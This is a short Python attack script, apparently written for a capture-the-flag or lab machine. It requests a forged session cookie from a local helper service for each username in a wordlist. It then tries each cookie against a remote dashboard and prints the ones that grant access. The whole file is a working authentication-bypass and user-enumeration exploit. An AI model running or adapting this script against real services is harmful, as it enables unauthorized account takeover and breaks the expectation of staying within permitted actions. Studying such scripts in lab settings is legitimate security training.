import requests

def generateCookieByName(username):
    r = requests.get(f'http://127.0.0.1:5000/{username}')
    return r.text


def check(cookie, username):
    cookies = {"session": cookie}
    r = requests.get('http://10.10.11.160:5000/dashboard', cookies=cookies, allow_redirects=False)
    if r.status_code == 200:
        print("[+]", cookie, username)


def bruteUsernames():
    with open('usernames.txt', 'r') as f:
        for username in f.readlines():
            cookie = generateCookieByName(username.strip())
            check(cookie, username)

bruteUsernames()


